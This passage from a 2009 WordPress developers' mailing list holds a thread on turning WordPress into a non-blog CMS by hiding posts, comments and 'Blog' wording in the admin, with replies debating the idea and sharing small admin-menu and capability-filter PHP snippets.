>
> Personally I would love to see a plugin that entirely removes or conceals
> the post/comment areas of the admin, and I'm considering making one.
>
> The Big Question:  What would a "CMS" plugin have to do?  Pots and comments
> are woven throughout the Admin, and I'd like to remove all aspects of them
> from the menus.  My "to do" list is below -- if I'm missing something, or if
> you have advice as to how to do some of this, I would appreciate.
>
>        1) Remove "Posts" and "Comments" from main menu.  (Am I correct that
> direct links will still work?  Is there a way to remove those areas entirely
> rather than just hiding the menu items?)
>
>        2) Remove "Recent Comments" and "QuickPress" from Dashboard.
>  (Again, can it be removed entirely or merely hidden?)
>
>        3) Remove "Press This" from Tools page (how?)
>
>        4) Writing Settings page -- remove/hide/turn off "Remote
> Publishing", "Post Via Email", and "Update Services" settings
>
>        5) Reading Settings page -- remove "Front Page Displays" option.
>  Set it to "static page".  Still must allow user to set the static page
> though.
>
>        (Since we're changing those two pages so much, perhaps remove them
> entirely and replace them with a new consolidated page?)
>
>        6) Remove "Discussion" settings page entirely.  Set default
> preferences to no comments or notifications.
>
>        7) Remove "Discussion" meta box from Edit Page page.
>
>        8) Remove Tags/Categories from Permalink Settings page
>
> Also, in general, I think WordPress itself should do a few things to lessen
> the "blog assumption".  Nothing major, but a few small things to consider:
>
>        1) On General Settings page, change "Blog Title" and "Blog Address"
> to "Site Title" and "Site Address"
>
>        2) Ditto "Privacy" page.  "Blog" s/b "Site"
>
> Good idea?  Bad?  Discuss!
>
> Stephen
>
> --
> Stephen Rider
> http://striderweb.com/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Wed Oct 21 20:08:49 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 15:08:49 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
Message-ID: <6136E620-A73F-43D2-B9F9-288F9FC24FAD@striderweb.com>

[edited for clarity]
Note:  This email repeats a lot of things I said in another email, for  
the benefit of those who are not following the Security thread.  For  
those who *are* following that thread, please skim to the bottom, as I  
pose a new and separate question from the security issues discussed  
elsewhere....

---
In the past, I've asked for advice on using WordPress as a straight  
CMS rather than a blog platform.  Such questions are routinely  
answered with remarks along the lines of, "It is a CMS, Dummy."

Fine it's a CMS.  But I just don't understand this attitude toward  
people asking about "WordPress as CMS" -- it's widespread and  
wrongheaded (including coming from one developer with whom I've had a  
very friendly relationship.)  As long as the "blog post" aspect is  
front and center, people will -- legitimately -- consider it "blog  
software".

Personally I would love to see a plugin that entirely removes or  
conceals the post/comment areas of the admin, and I'm considering  
making one.

The Big Question:  What would a "CMS" plugin have to do?  Posts and  
comments are woven throughout the Admin, and I'd like to remove all  
aspects of them from the menus.  My "to do" list is below -- if I'm  
missing something, or if you have advice as to how to do some of this,  
I would appreciate.

	1) Remove "Posts" and "Comments" from main menu.  (Am I correct that  
direct links will still work?  Is there a way to remove those areas  
entirely rather than just hiding the menu items?)

	2) Remove "Recent Comments" and "QuickPress" from Dashboard.  (Again,  
can it be removed entirely or merely hidden?)

	3) Remove "Press This" from Tools page (how?)

	4) Writing Settings page -- remove/hide/turn off "Remote Publishing",  
"Post Via Email", and "Update Services" settings

	5) Reading Settings page -- remove "Front Page Displays" option.  Set  
it to "static page".  Still must allow user to set the static page  
though.

	(Since we're changing those two pages so much, perhaps remove them  
entirely and replace them with a new consolidated page?)

	6) Remove "Discussion" settings page entirely.  Set default  
preferences to no comments or notifications.

	7) Remove "Discussion" meta box from Edit Page page.

	8) Remove Tags/Categories from Permalink Settings page

Also, in general, I think WordPress itself should do a few things to  
lessen the "blog assumption".  Nothing major, but a few small things  
to consider:

	1) On General Settings page, change "Blog Title" and "Blog Address"  
to "Site Title" and "Site Address"

	2) Ditto "Privacy" page.  "Blog" s/b "Site"

Good idea?  Bad?  Discuss!

Stephen

-- 
Stephen Rider
http://striderweb.com/

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Wed Oct 21 20:12:17 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Oct 2009 16:12:17 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <862d087f0910211305i1b0a32eaga4574713316419ec@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<862d087f0910211305i1b0a32eaga4574713316419ec@mail.gmail.com>
Message-ID: <2EE112CD-0D81-42BF-830A-55EA815377A8@newclarity.net>

> You're most likely about to be told either:
>
> 1) If you want a website CMS (non-blog) then try drupal/joomla/EE
> 2) If you MUST use WP as a site CMS (non-blog) just tell your client  
> to
> ignore the blog stuff.

You are probably right. And if you are, it's a real damn shame.

> FWIW, I like the idea of a lightweight plugin that does nothing but  
> remove
> all references to blog posts, comments, etc. I think it's a fine idea.

I too really want to use WordPress as a CMS first and a blogging tool  
second. I run into 5 people who want the former for every one who  
wants the latter.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/





From wp-hackers at striderweb.com  Wed Oct 21 20:13:57 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 15:13:57 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <474320ee0910211306p5766efc9ibca2c4312c920e1@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<474320ee0910211306p5766efc9ibca2c4312c920e1@mail.gmail.com>
Message-ID: <1038D657-2F66-4036-B777-5064AE94091A@striderweb.com>


On Oct 21, 2009, at 3:06 PM, Steven Rossi wrote:

> it's hard to get around that blog stigma when working in a group  
> environment
> with Wordpress.
>
> Perhaps my favorite suggestion in your email is the switch from Blog
> Title/Blog Address to Site Title/Site Address. I've always been  
> surprised
> that the "Blog" terms have stuck around as long as they have. I'd be  
> all for
> a switch.

Heh.  At least the software isn't called "BlogPress".  Then we'd  
really be screwed.  ("Hey, I think we should change the name of the  
entire platform!" ;-) )

From scribu at gmail.com  Wed Oct 21 20:19:14 2009
From: scribu at gmail.com (scribu)
Date: Wed, 21 Oct 2009 23:19:14 +0300
Subject: [wp-hackers] Canonical "one time" plugins?
In-Reply-To: <CADFEB1C-716B-4592-B9DC-B9F3A606BC0E@striderweb.com>
References: <CADFEB1C-716B-4592-B9DC-B9F3A606BC0E@striderweb.com>
Message-ID: <349fe48b0910211319i6581bf81l7b926c65dd13ff1c@mail.gmail.com>

On Wed, Oct 21, 2009 at 10:47 PM, Stephen Rider
<wp-hackers at striderweb.com>wrote:

> It occurs to me:  Would it be possible to set the downloads up so that if a
> person goes to wordpress.org and downloads the zip file, (usually a new
> user), they get certain plugins, but that those plugins are *not* included
> in automatic updates?  (Or perhaps included in automatic updates *only* if
> they are still installed on the site?)
>
> That way, Hello Dolly/Akismet/Import/whatever could be included, but if a
> user deletes it, it isn't recreated on every update.  The same for the
> Import plugin.  There could be a lot of things that would be useful to
> include as "canonical" plugins for new setups that are handled this way.
>
> Thoughts?
>

I think that would be *the* way to include canonical plugins, going forward.

But it wouldn't be worth it just for the Hello Dolly plugin, IMO.


-- 
http://scribu.net

From me at olumidealabi.com  Wed Oct 21 20:28:24 2009
From: me at olumidealabi.com (Olumide Alabi)
Date: Wed, 21 Oct 2009 20:28:24 +0000
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <474320ee0910211306p5766efc9ibca2c4312c920e1@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com><474320ee0910211306p5766efc9ibca2c4312c920e1@mail.gmail.com>
Message-ID: <1719015217-1256156948-cardhu_decombobulator_blackberry.rim.net-1144532063-@bda106.bisx.produk.on.blackberry>

I feel Steven Rossi and where he's coming from. I'm not sure how difficult it would be to pull off or what will be affected by implementing what I'm about to suggest but here goes.

What if the during the install, the page that asks for Blog Title has 2 radio buttons that allow you choose whether you want to use the current install as a blog or a non-blog website and then hides/disables/removes ( whatever the best thing would be) all superfluous elements.

Just my 2 cents.

Best Regards, 
Luminus.
Sent from my BlackBerry? smartphone from Zain Nigeria

-----Original Message-----
From: Steven Rossi <SuperMoonMan at gmail.com>
Date: Wed, 21 Oct 2009 15:06:29 
To: <wp-hackers at lists.automattic.com>
Subject: Re: [wp-hackers] WordPress as CMS (was: wordpress security)

Sounds great to me! If this hasn't been done before (which to my knowledge,
it hasn't), I can see a big market for it. I've been working towards using
Wordpress in development of more traditional (that is, non-blog) sites, and
it's hard to get around that blog stigma when working in a group environment
with Wordpress.

Perhaps my favorite suggestion in your email is the switch from Blog
Title/Blog Address to Site Title/Site Address. I've always been surprised
that the "Blog" terms have stuck around as long as they have. I'd be all for
a switch.

Steven Rossi
http://www.letsmovetothemoon.com
http://stevenjrossi.com
http://www.twitter.com/supermoonman

On Wed, Oct 21, 2009 at 3:00 PM, Stephen Rider <wp-hackers at striderweb.com>wrote:

> Note:  This email repeats a lot of things I said in another email, for the
> benefit of those who are not following the Security thread.  For those who
> *are* following that thread, please skim to the bottom, as I pose a new and
> separate question from the security issues discussed elsewhere....
>
> On Oct 21, 2009, at 9:03 AM, Otto wrote:
>
>  A site that the admin has not visited in 2 months is, IMO, a dead
>> site. No new content, no readers, nobody caring for it...
>>
>
> In the past, I've asked for advice on using WordPress as a straight CMS
> rather than a blog platform.  Such questions are routinely answered with
> remarks along the lines of, "It is a CMS, Dummy."
>
> Fine it's a CMS.  But as such we must accept that many users are using
> WordPress to set up their sites, and edit them when needed, but are NOT
> routinely adding new content, /a la/ a blog.  In such circumstances, a site
> can **easily** go two months without being updated.
>
> I just don't understand this "screw 'em" attitude.  The attitude toward
> people asking about "WordPress as CMS" is widespread and wrongheaded
> (including coming from one developer with whom I've had a very friendly
> relationship.)  As long as the "blog post" aspect is front and center,
> people will -- legitimately -- consider it "blog software".
>
> Personally I would love to see a plugin that entirely removes or conceals
> the post/comment areas of the admin, and I'm considering making one.
>
> The Big Question:  What would a "CMS" plugin have to do?  Pots and comments
> are woven throughout the Admin, and I'd like to remove all aspects of them
> from the menus.  My "to do" list is below -- if I'm missing something, or if
> you have advice as to how to do some of this, I would appreciate.
>
>        1) Remove "Posts" and "Comments" from main menu.  (Am I correct that
> direct links will still work?  Is there a way to remove those areas entirely
> rather than just hiding the menu items?)
>
>        2) Remove "Recent Comments" and "QuickPress" from Dashboard.
>  (Again, can it be removed entirely or merely hidden?)
>
>        3) Remove "Press This" from Tools page (how?)
>
>        4) Writing Settings page -- remove/hide/turn off "Remote
> Publishing", "Post Via Email", and "Update Services" settings
>
>        5) Reading Settings page -- remove "Front Page Displays" option.
>  Set it to "static page".  Still must allow user to set the static page
> though.
>
>        (Since we're changing those two pages so much, perhaps remove them
> entirely and replace them with a new consolidated page?)
>
>        6) Remove "Discussion" settings page entirely.  Set default
> preferences to no comments or notifications.
>
>        7) Remove "Discussion" meta box from Edit Page page.
>
>        8) Remove Tags/Categories from Permalink Settings page
>
> Also, in general, I think WordPress itself should do a few things to lessen
> the "blog assumption".  Nothing major, but a few small things to consider:
>
>        1) On General Settings page, change "Blog Title" and "Blog Address"
> to "Site Title" and "Site Address"
>
>        2) Ditto "Privacy" page.  "Blog" s/b "Site"
>
> Good idea?  Bad?  Discuss!
>
> Stephen
>
> --
> Stephen Rider
> http://striderweb.com/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From scribu at gmail.com  Wed Oct 21 20:31:34 2009
From: scribu at gmail.com (scribu)
Date: Wed, 21 Oct 2009 23:31:34 +0300
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
Message-ID: <349fe48b0910211331o68726ea3u7346f1df61fa42e1@mail.gmail.com>

I've seen alot of plugins for "using WP as a CMS", but none that actually
hide the blog parts.

I wish I had though of this ideea first. Darn...



>        1) Remove "Posts" and "Comments" from main menu.  (Am I correct that
> direct links will still work?  Is there a way to remove those areas entirely
> rather than just hiding the menu items?)
>

Hook into 'admin_init' and redirect to dashboard or wherever.



>        2) Remove "Recent Comments" and "QuickPress" from Dashboard.
>  (Again, can it be removed entirely or merely hidden?)
>

That's easy. Just use remove_meta_box().



>        3) Remove "Press This" from Tools page (how?)
>

No ideea.



>        4) Writing Settings page -- remove/hide/turn off "Remote
> Publishing", "Post Via Email", and "Update Services" settings
>

I think you can use the Settings API for that.


       5) Reading Settings page -- remove "Front Page Displays" option.  Set
> it to "static page".  Still must allow user to set the static page though.
>

CSS only, I think.



> Also, in general, I think WordPress itself should do a few things to lessen
> the "blog assumption".  Nothing major, but a few small things to consider:
>
>        1) On General Settings page, change "Blog Title" and "Blog Address"
> to "Site Title" and "Site Address"
>
>        2) Ditto "Privacy" page.  "Blog" s/b "Site"
>

Definetly Trac material.


Be sure to keep us posted on this plugin.


-- 
http://scribu.net

From mike at zed1.com  Wed Oct 21 20:33:58 2009
From: mike at zed1.com (Mike Little)
Date: Wed, 21 Oct 2009 21:33:58 +0100
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <6136E620-A73F-43D2-B9F9-288F9FC24FAD@striderweb.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com> 
	<6136E620-A73F-43D2-B9F9-288F9FC24FAD@striderweb.com>
Message-ID: <7235ce780910211333p58748b32t5d7ef03793c5b9a9@mail.gmail.com>

2009/10/21 Stephen Rider <wp-hackers at striderweb.com>

> [edited for clarity]
> Note:  This email repeats a lot of things I said in another email, for the
> benefit of those who are not following the Security thread.  For those who
> *are* following that thread, please skim to the bottom, as I pose a new and
> separate question from the security issues discussed elsewhere....
>
> ---
>
>
> The Big Question:  What would a "CMS" plugin have to do?  Posts and
> comments are woven throughout the Admin, and I'd like to remove all aspects
> of them from the menus.  My "to do" list is below -- if I'm missing
> something, or if you have advice as to how to do some of this, I would
> appreciate.
>
>

Stephen,

Take a look at a plugin like Adminize
http://wordpress.org/extend/plugins/adminimize/

which allows you turn do things like turn off the posts menu for individual
levels of user, and turn off lots of other things at a fairly fine-grained
level.

You can also use the translation capability to 'translate' the names of
things into something else. I know of one person who simply created a
language pack that changed all references to 'post' to be 'news' or
something similar.


Mike
-- 
Mike Little
http://zed1.com/

From otto at ottodestruct.com  Wed Oct 21 20:40:11 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 21 Oct 2009 15:40:11 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com> 
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com> 
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com> 
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com> 
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com> 
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com> 
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
Message-ID: <161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>

On Wed, Oct 21, 2009 at 2:22 PM, Stephen Rider
<wp-hackers at striderweb.com> wrote:
> But as such we must accept that many users are using
> WordPress to set up their sites, and edit them when needed, but are NOT
> routinely adding new content, /a la/ a blog. ?In such circumstances, a site
> can **easily** go two months without being updated.

IMO, such a site should not be using WordPress.

If you're going to make a static site, WordPress is not the correct
tool for the job.

-Otto

From TurnerJD at cofc.edu  Wed Oct 21 20:43:02 2009
From: TurnerJD at cofc.edu (John Turner)
Date: Wed, 21 Oct 2009 16:43:02 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <2EE112CD-0D81-42BF-830A-55EA815377A8@newclarity.net>
Message-ID: <C704EA96.153FE%TurnerJD@cofc.edu>

What would a "CMS" plugin have to do?

I think this would be based on the type of cms you want to create and it's
goals. I don't think one plugin would suffice.

I'm about to launch a wordpress mu site for bands and I created a lot of
plugins to remove , rename, and reorder the menu, I used javascript to
change a lot of the text on the pages and hide or change other elements.
reorder and remove dashboard widgets, filter plugins, shortcodes for post
types, alter the sign up, filter widgets, create default pages, etc..

I don't have my demo live right now  because I'm still testing servers but
you can see a demo here. http://vimeo.com/6691281. It's a little long but as
I go through the demo , you can see all the cms changes I have made.

So I don't think just one plugin will work since there are so many different
needs. I think it would take a collection like BuddyPress originally.

My pluigns are not release ready , but I plan too once my site goes live.

Thanks,

John Turner
http://johndturner.com
http://twitter.com/johnturner



> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Reply-To: <wp-hackers at lists.automattic.com>
> Date: Wed, 21 Oct 2009 16:12:17 -0400
> To: <wp-hackers at lists.automattic.com>
> Subject: Re: [wp-hackers] WordPress as CMS (was: wordpress security)
> 
>> You're most likely about to be told either:
>> 
>> 1) If you want a website CMS (non-blog) then try drupal/joomla/EE
>> 2) If you MUST use WP as a site CMS (non-blog) just tell your client
>> to
>> ignore the blog stuff.
> 
> You are probably right. And if you are, it's a real damn shame.
> 
>> FWIW, I like the idea of a lightweight plugin that does nothing but
>> remove
>> all references to blog posts, comments, etc. I think it's a fine idea.
> 
> I too really want to use WordPress as a CMS first and a blogging tool
> second. I run into 5 people who want the former for every one who
> wants the latter.
> 
> -Mike Schinkel
> WordPress Custom Plugins
> http://mikeschinkel.com/custom-wordpress-plugins/
> 
> 
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jason at realestatetomato.com  Wed Oct 21 20:44:31 2009
From: jason at realestatetomato.com (Jason Benesch)
Date: Wed, 21 Oct 2009 13:44:31 -0700
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <7235ce780910211333p58748b32t5d7ef03793c5b9a9@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<6136E620-A73F-43D2-B9F9-288F9FC24FAD@striderweb.com>
	<7235ce780910211333p58748b32t5d7ef03793c5b9a9@mail.gmail.com>
Message-ID: <579c69ac0910211344vbed9c40hccb5f659e6e65045@mail.gmail.com>

 > 1) Remove "Posts" and "Comments" from main menu.  (Am I correct that
> direct links will still work?  Is there a way to remove those areas
entirely
> rather than just hiding the menu items?)

> Hook into 'admin_init' and redirect to dashboard or wherever.

You wouldn't want to do a redirect.  Just remove the specific page from the
menu array.

Example:

function edit_your_menu() {
    global $menu, $submenu;
    unset( $submenu[ 'wpmu-admin.php' ][30] );
}
add_action('admin_menu','edit_your_menu');

The menu is stored in the $menu array and the submenu is stored in the
$submenu array...


It seems like your problem isn't with functionality but more with semantics
of how the admin section is laid out.

If you are going to write a plugin, you could very easily just hook in to
the admin_menu and completely customize the look and feel of what you think
a CMS should look like.


On Wed, Oct 21, 2009 at 1:33 PM, Mike Little <mike at zed1.com> wrote:

> 2009/10/21 Stephen Rider <wp-hackers at striderweb.com>
>
> > [edited for clarity]
> > Note:  This email repeats a lot of things I said in another email, for
> the
> > benefit of those who are not following the Security thread.  For those
> who
> > *are* following that thread, please skim to the bottom, as I pose a new
> and
> > separate question from the security issues discussed elsewhere....
> >
> > ---
> >
> >
> > The Big Question:  What would a "CMS" plugin have to do?  Posts and
> > comments are woven throughout the Admin, and I'd like to remove all
> aspects
> > of them from the menus.  My "to do" list is below -- if I'm missing
> > something, or if you have advice as to how to do some of this, I would
> > appreciate.
> >
> >
>
> Stephen,
>
> Take a look at a plugin like Adminize
> http://wordpress.org/extend/plugins/adminimize/
>
> which allows you turn do things like turn off the posts menu for individual
> levels of user, and turn off lots of other things at a fairly fine-grained
> level.
>
> You can also use the translation capability to 'translate' the names of
> things into something else. I know of one person who simply created a
> language pack that changed all references to 'post' to be 'news' or
> something similar.
>
>
> Mike
> --
> Mike Little
> http://zed1.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jason Benesch

Real Estate Tomato
Co-owner
www.realestatetomato.com
(619) 770-1950
jason at realestatetomato.com

ListingPress
Owner, Founder
www.listingpress.com
(619) 955-7465
jason at listingpress.com

From otto at ottodestruct.com  Wed Oct 21 20:47:30 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 21 Oct 2009 15:47:30 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
Message-ID: <161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>

I don't get it. Why would anybody want to use WordPress, but disable
all the useful features?

I'm a strong believer in the right tool for the right job. If you're
not making a blog (by which I mean a stream of continuing content of
some type), then WordPress is not the right tool to be using.

If I wanted an easy-to-edit but semi-static site with no discussion or
feedback from other users, hooked to a templating and theming
mechanism, then I'd look at Wiki software instead, with editing being
limited to the registered users (and registration turned off). I'd
certainly not look at WordPress or any other "CMS" type software, nor
would I recommend any of these to a client for such a case.

My advice would be to make a plugin that erases WordPress and installs
some other piece of software more suitable for their needs. WordPress
is great, but it is not the end-all be-all of software packages. It
was never intended, and is not now, suitable for all cases. No
software is ever going suitable for all cases when the "case" is so
broad as "web site".

-Otto
Sent from Memphis, TN, United States

From jmiloj at gmail.com  Wed Oct 21 20:53:37 2009
From: jmiloj at gmail.com (Jerry Johnson)
Date: Wed, 21 Oct 2009 16:53:37 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
Message-ID: <a1fff2b20910211353h74acd973yc731dfbe04a7c356@mail.gmail.com>

Now that's just funny right there.

I personally think it is a great idea. I will be following along as an
interested spectator.

Jerry Milo Johnson


On Wed, Oct 21, 2009 at 4:47 PM, Otto <otto at ottodestruct.com> wrote:

> <snip>



> My advice would be to make a plugin that erases WordPress and installs
> some other piece of software more suitable for their needs.
>

From joost at yoast.com  Wed Oct 21 20:57:03 2009
From: joost at yoast.com (Joost de Valk)
Date: Wed, 21 Oct 2009 22:57:03 +0200
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
Message-ID: <666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>

Otto,
I think there are now dozens of people on this list who are NOT agreeing
with you. Me and my company are rapidly using WordPress to replace large
corporate CMS'es, usually without using the blog functionality or by calling
it the "news section". We do so for a couple of reasons:
- because it's easy to develop for, and thus easy to hire people for,
- there's a slew of plugins available making a lot of the work that's
otherwise custom work as easy as flipping a switch,
- the interface is user friendly

And, more importantly: a lot of people KNOW WordPress from their blogs. It's
much like why most of the world uses Microsoft Word, even when they're
writing a book. Yes there are probably tools that, architecturally, are
better suited for the job, but because everyone knows how to use WordPress,
it's actually easier to implement. (this analogy is poorly written but hey,
i'm jotting it down quickly)

So, if you choose to do something else with WordPress, please do, but for a
lot of us, WordPress already IS a CMS. And I agree with Stephen that it's
about time we got the chance to change the wording in a lot of spaces. It
may sound trivial, but the wording is actually a *very* important part of
the interface... :)

Best,
Joost

On Wed, Oct 21, 2009 at 10:47 PM, Otto <otto at ottodestruct.com> wrote:

> I don't get it. Why would anybody want to use WordPress, but disable
> all the useful features?
>
> I'm a strong believer in the right tool for the right job. If you're
> not making a blog (by which I mean a stream of continuing content of
> some type), then WordPress is not the right tool to be using.
>
> If I wanted an easy-to-edit but semi-static site with no discussion or
> feedback from other users, hooked to a templating and theming
> mechanism, then I'd look at Wiki software instead, with editing being
> limited to the registered users (and registration turned off). I'd
> certainly not look at WordPress or any other "CMS" type software, nor
> would I recommend any of these to a client for such a case.
>
> My advice would be to make a plugin that erases WordPress and installs
> some other piece of software more suitable for their needs. WordPress
> is great, but it is not the end-all be-all of software packages. It
> was never intended, and is not now, suitable for all cases. No
> software is ever going suitable for all cases when the "case" is so
> broad as "web site".
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From SuperMoonMan at gmail.com  Wed Oct 21 20:57:07 2009
From: SuperMoonMan at gmail.com (Steven Rossi)
Date: Wed, 21 Oct 2009 15:57:07 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com> 
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
Message-ID: <474320ee0910211357q4c47fc15te39d1d62fc01ae93@mail.gmail.com>

I sorta agree with that: Wordpress has a lot of extra features that a simple
site would not need. At the same time, though, it's extremely easy to set up
and customize, and that's not to mention how many headaches can be saved by
using it rather than a complex custom CMS for a client. I've seen lots of
uses for Wordpress that don't involve blog posts (i.e. business card-type
themes, portfolios, and on and on...see articles like Noupe's 25 Unique Uses
of Wordpress as a CMS [
http://www.noupe.com/wordpress/25-unique-uses-of-wordpress-as-cms.html] for
some more examples). It's a powerful CMS, and I advocate its use in a wide
variety of functions.
I don't want to go overboard, however, and say that a simple 1- or 2-page
site should be built using Wordpress. Some things are better off just
hand-coded. I just think that Wordpress is very powerful and versatile.

Steven Rossi
http://www.letsmovetothemoon.com
http://stevenjrossi.com
http://www.twitter.com/supermoonman

On Wed, Oct 21, 2009 at 3:47 PM, Otto <otto at ottodestruct.com> wrote:

> I don't get it. Why would anybody want to use WordPress, but disable
> all the useful features?
>
> I'm a strong believer in the right tool for the right job. If you're
> not making a blog (by which I mean a stream of continuing content of
> some type), then WordPress is not the right tool to be using.
>
> If I wanted an easy-to-edit but semi-static site with no discussion or
> feedback from other users, hooked to a templating and theming
> mechanism, then I'd look at Wiki software instead, with editing being
> limited to the registered users (and registration turned off). I'd
> certainly not look at WordPress or any other "CMS" type software, nor
> would I recommend any of these to a client for such a case.
>
> My advice would be to make a plugin that erases WordPress and installs
> some other piece of software more suitable for their needs. WordPress
> is great, but it is not the end-all be-all of software packages. It
> was never intended, and is not now, suitable for all cases. No
> software is ever going suitable for all cases when the "case" is so
> broad as "web site".
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mark at watero.us  Wed Oct 21 21:00:54 2009
From: mark at watero.us (mark waterous)
Date: Wed, 21 Oct 2009 14:00:54 -0700
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
Message-ID: <004901ca5291$94e3c0d0$beab4270$@us>

> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-
> bounces at lists.automattic.com] On Behalf Of Stephen Rider
> Sent: Wednesday, October 21, 2009 1:00 PM
> To: wp-hackers at lists.automattic.com
> 
> 
> 1) Remove "Posts" and "Comments" from main menu.  (Am I correct that
> direct links will still work?  Is there a way to remove those areas
> entirely rather than just hiding the menu items?)


I might be way off base here, but is removing these things truly beneficial
for pushing Wordpress towards being more widely accepted for its CMS
capabilities?

It occurs to me that Posts, in combination with the WP_Query object is one
of Wordpress' most powerful features for customization and functionality.
This has been demonstrated time and again by various designers and
developers. Maybe changing the naming conventions would be a better
practice, or removing Pages instead? That would leave you with the ability
to still tag and categorize posts for use in custom template designs, or
attach comments, which can be a major factor in most online communities. 



From anacin at gwhatchet.com  Wed Oct 21 21:06:40 2009
From: anacin at gwhatchet.com (Andrew Nacin)
Date: Wed, 21 Oct 2009 17:06:40 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <349fe48b0910211331o68726ea3u7346f1df61fa42e1@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com> 
	<349fe48b0910211331o68726ea3u7346f1df61fa42e1@mail.gmail.com>
Message-ID: <8b870c460910211406k7fed1bafp91d376bb04b952ca@mail.gmail.com>

Press This requires the edit_posts capability. But since no one should have
any _posts capabilities:

 add_filter('user_has_cap', 'cms_remove_post_caps');
 function cms_remove_post_caps($caps) {
    foreach ($caps as $cap=>$v)
        if (substr($cap,-5)=='posts') unset($caps[$cap]);
    $remove = array('manage_categories','moderate_comments');
    foreach ($remove as $cap)
        unset($caps[$cap]);
